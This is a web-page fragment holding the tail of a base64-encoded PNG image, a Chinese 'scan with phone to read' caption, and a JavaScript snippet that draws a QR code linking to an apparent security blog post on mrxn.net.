fDea6OX6UJ41jwqkhEiy77wamv8tSl0aD3n0IP2t8fIiY1xmzHkKXuawdfTjWX60x1tQaoq780SBiwBgq1/kcwD6FWQjBQUfHoXP/mwnxm/uv42rIm3Ww/R4CfWwgfJ81j6M5CA1gqmHWA/v4QscmLBzoOtexDHqs4iDijgldAz6OAUr5FvM5MlYbrQmpbuVGrn2ou3MfncW6jMA+Bc6FWAOmntC5maw44KnuR3rXyAjPNapY5rxH5iBqQMdRBz3mXOgchO88IQRnvXBNiG7mjWw15I2aoaNMH+oibRAj5bUQgoOO4mUaOZl8m9Yyr4UQufLPTHnZshaiRo5DcFmX4/IhNDD/1T702FkN1XEcIsdrIcyc+NFURwahB9b/PdPjzf5NH+rq2Gj5zGMsryE6nfUwc86pdI4JYc7NOUc+RB7MqLq2o3zxMOeKH821KsxaxzNX+eszpLqVxv28M32GwPxkwDk3HttPQ8ZRc7SGvteRRrxrw6x3TCitTL4Muh7CV3w0aUcbNXkNUQvI9Mv+mpCXr+x7E1ZDvvd+X67eGjKO50frV3fK9YD9N3Do6HhVF0JnjRBmzrkQMZh/tLXmCFVbBr2GtTBzjinHZi4jRG7mKr81pAou7udvYGoIRCehxrMj+gmBObfKs15Yxc0pLoNeV2sZdG7UK15x4rNZI4SoJ/+KQehhxiv50uSzTA2RYNl9N7Aact/dlzt/e0M8jnl3c/DamDtP6HrybeZgrgvBWSOEmRN/ZN5HaI380RyrEGJPqPHbG1Id6m/nzt7/H20IRNerDSFiQBVuXH7aGnniAO1H6BNZC8FreiVCz4HwxcvgeS3O70G+reIcy/hHG5ILL/9zN7Aa8rl7+7asqSEerSM8O0mVA/NIw8w5N9cfOYg8oMmsydiCm2N+c196Oe8IXcxxYPrW6ZgQIi7/zKaGeKOF99xAawhEB+Eanh0Xeg3rzp4KxSByrBfCzIk/Mpj18Mxpr9GO6o08RC2ghYB9MnJNByFigKkSgb0GsP4r3Meb/WsT8mbn+muP8y8AAAD//58YKMYAAAAGSURBVAMA0dkfmwBV/38AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-endCallback-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 